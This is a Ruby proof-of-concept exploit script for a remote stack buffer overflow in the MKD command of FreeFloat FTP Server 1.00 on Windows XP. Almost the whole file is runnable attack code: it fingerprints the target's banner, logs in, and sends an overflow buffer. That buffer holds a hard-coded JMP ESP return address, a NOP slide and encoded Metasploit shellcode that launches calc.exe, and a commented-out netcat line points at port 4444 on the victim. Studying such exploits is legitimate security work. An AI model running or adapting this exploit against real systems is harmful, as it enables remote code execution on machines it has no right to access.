#!/usr/bin/env ruby
#
#[+]Exploit Title: FreeFloat FTP Server MKD Buffer Overflow Exploit
#[+]Date: 16\06\2011
#[+]Author: Original +=C4SS!0 G0M3S | TechEditor +=isomorphix | Code updates +=nanoquetz9l
#[+]Software Link: http://www.freefloat.com/software/freefloatftpserver.zip
#[+]Original Exploit Link: http://www.exploit-db.com/exploits/17539/
#[+]Version: 1.00
#[+]Tested On: Windows XP SP3
#[+]CVE: N/A
#
#
 
require 'socket'
require 'rainbow'
 
def banner()
 print """
      
          =================================================================
          =================================================================
          ==========FreeFloat FTP Server Buffer Overflow Remote Exploit====
          ==========Original Author Mario Gomez | C4SS!0 G0M3S=============
          ==========E-mail louredo_@hotmail.com============================
          =================================================================
          ==========Technical Editor Javier Godinez | isomorphix===========
          ==========E-mail godinezj@gmail.com==============================
          =================================================================
          ==========Code updates by Rick Flores | nanotechz9l==============
          ==========E-mail 0xnanotechz9l@gmail.com=========================
	  =================================================================
          =================================================================
 
"""
end
def exploit(buffer,target,port)
begin
s = TCPSocket.new(target,port.to_i)
s.recv(20000)
s.puts "USER test\r\n"
s.recv(2000)
s.puts "PASS test\r\n"
s.recv(2000)
s.puts "MKD #{buffer}\r\n"
s.close
s = TCPSocket.new(target,port)
sleep(1)
s.close
rescue
print "\t\t[*]Error: #{$!}\n"
exit(0)
end
end

#sys = `ver`
#if sys=~/Windows/
#    system("cls")
#    system("color 4f")
#    system("title FreeFloat FTP Server MKD Buffer Overflow Exploit")
#else
#   system("clear")
#end

if not ARGV[1]
 banner()
 print "\t\t[-]Usage: #{$0} <Host> <Port>\n".foreground(:red).bright
 print "\t\t[-]Example: #{$0} 10.2.17.130 21\n".foreground(:red).bright
 exit(0)
end
banner()

target = ARGV[0]
port = ARGV[1].to_i
print "\t\t[+] Connecting to Victim "+target+" ...5% Complete\n\n"
sleep(2)
begin
socket = TCPSocket.new(target,port)
print "\t\t[+] Checking if target is vulnerable " + "...10% Complete\n\n".foreground(:red).bright
sleep(2)
c = socket.recv(2000)
rescue
print "\t\t[*]Error:#{$!}\n"
exit(0)
end
 
unless c =~/FreeFloat Ftp Server \(Version 1\.00\)/
print "\t\t[+] Machine Not Vulnerable :( " + "...100% Complete\n".foreground(:red).bright.blink
sleep(1)
exit(0)
end
socket.close
print "\t\t[+] Victim machine is VULNERABLE :) ".foreground(:blue).bright + "...50% Complete\n\n".foreground(:red).bright
sleep(2)
print "\t\t[+] Sending evil Remote Buffer Overflow Attack " + "...75% Complete\n\n".foreground(:red).bright
sleep(2)

# ./msfpayload windows/exec EXITFUNC="SEH" CMD="calc.exe" R | msfencode -e x86/alpha_upper
#[*] x86/alpha_upper succeeded with size 468 bytes (iteration=1)

shellcode = 
"\x89\xe2\xdb\xdd\xd9\x72\xf4\x5a\x4a\x4a\x4a\x4a\x4a\x43" +
"\x43\x43\x43\x43\x43\x52\x59\x56\x54\x58\x33\x30\x56\x58" +
"\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42" +
"\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30" +
"\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a\x48" +
"\x4b\x39\x55\x50\x33\x30\x45\x50\x53\x50\x4d\x59\x5a\x45" +
"\x56\x51\x38\x52\x42\x44\x4c\x4b\x56\x32\x50\x30\x4c\x4b" +
"\x31\x42\x44\x4c\x4c\x4b\x50\x52\x52\x34\x4c\x4b\x53\x42" +
"\x36\x48\x44\x4f\x58\x37\x30\x4a\x47\x56\x56\x51\x4b\x4f" +
"\x50\x31\x39\x50\x4e\x4c\x57\x4c\x35\x31\x43\x4c\x45\x52" +
"\x46\x4c\x37\x50\x4f\x31\x48\x4f\x34\x4d\x43\x31\x4f\x37" +
"\x5a\x42\x4c\x30\x50\x52\x46\x37\x4c\x4b\x51\x42\x42\x30" +
"\x4c\x4b\x57\x32\x57\x4c\x43\x31\x58\x50\x4c\x4b\x51\x50" +
"\x53\x48\x4b\x35\x49\x50\x44\x34\x50\x4a\x45\x51\x58\x50" +
"\x46\x30\x4c\x4b\x47\x38\x52\x38\x4c\x4b\x50\x58\x31\x30" +
"\x33\x31\x58\x53\x5a\x43\x37\x4c\x51\x59\x4c\x4b\x50\x34" +
"\x4c\x4b\x35\x51\x49\x46\x36\x51\x4b\x4f\x30\x31\x4f\x30" +
"\x4e\x4c\x4f\x31\x38\x4f\x34\x4d\x53\x31\x49\x57\x50\x38" +
"\x4b\x50\x33\x45\x4b\x44\x43\x33\x53\x4d\x5a\x58\x57\x4b" +
"\x53\x4d\x36\x44\x44\x35\x4d\x32\x51\x48\x4c\x4b\x51\x48" +
"\x31\x34\x53\x31\x39\x43\x43\x56\x4c\x4b\x44\x4c\x30\x4b" +
"\x4c\x4b\x36\x38\x45\x4c\x53\x31\x39\x43\x4c\x4b\x55\x54" +
"\x4c\x4b\x55\x51\x58\x50\x4b\x39\x51\x54\x56\x44\x36\x44" +
"\x51\x4b\x31\x4b\x43\x51\x30\x59\x51\x4a\x50\x51\x4b\x4f" +
"\x4b\x50\x51\x48\x31\x4f\x31\x4a\x4c\x4b\x55\x42\x4a\x4b" +
"\x4d\x56\x51\x4d\x33\x5a\x43\x31\x4c\x4d\x4d\x55\x4e\x59" +
"\x55\x50\x35\x50\x53\x30\x56\x30\x35\x38\x50\x31\x4c\x4b" +
"\x42\x4f\x4b\x37\x4b\x4f\x58\x55\x4f\x4b\x4d\x30\x55\x4d" +
"\x46\x4a\x54\x4a\x55\x38\x4e\x46\x5a\x35\x4f\x4d\x4d\x4d" +
"\x4b\x4f\x48\x55\x57\x4c\x53\x36\x53\x4c\x34\x4a\x4d\x50" +
"\x4b\x4b\x4d\x30\x43\x45\x33\x35\x4f\x4b\x50\x47\x34\x53" +
"\x52\x52\x52\x4f\x52\x4a\x33\x30\x51\x43\x4b\x4f\x59\x45" +
"\x52\x43\x55\x31\x32\x4c\x45\x33\x46\x4e\x52\x45\x54\x38" +
"\x43\x55\x35\x50\x41\x41"

#buf = "X" * 247 +           "V" * 4 +                    "Z" * 736 # EIP should get overwritten by exactly 4 V's or 56:56:56:56

buffer = "\x41" * 247 # Buffer = 247 A's

# .pack('V') converts ESP(pointer) to little endian architecture (Long, little-endian byte order), alt is to write 4413//orig
#buffer += [0x7C874413].pack('V') # JMP ESP pointer in kernel32.dll SP3
buffer += [0x7c80AE31].pack('V') # JMP ESP pointer in kernel32.dll #SP2
buffer += "\x90" * 20 # NOP slide
buffer += shellcode

# This code is responsible for the continuation of the buffer with more A's
# For the app to crash it is necessary to complete the buffer
buffer += "\x41" * (1000-buffer.length)
exploit(buffer,target,port)

print "\t\t[+] Attack Buffer Overflow Successfully Executed " + "...95% Complete\n\n".foreground(:red).bright
sleep(2)
print "\t\t[+] Popping calc.exe on: \" #{target}\" ".foreground(:green).bright + "PoC 100% DELIVERED & COMPLETE...\n\n".foreground(:red).bright.blink
#sleep(1)
#system("nc #{target} 4444")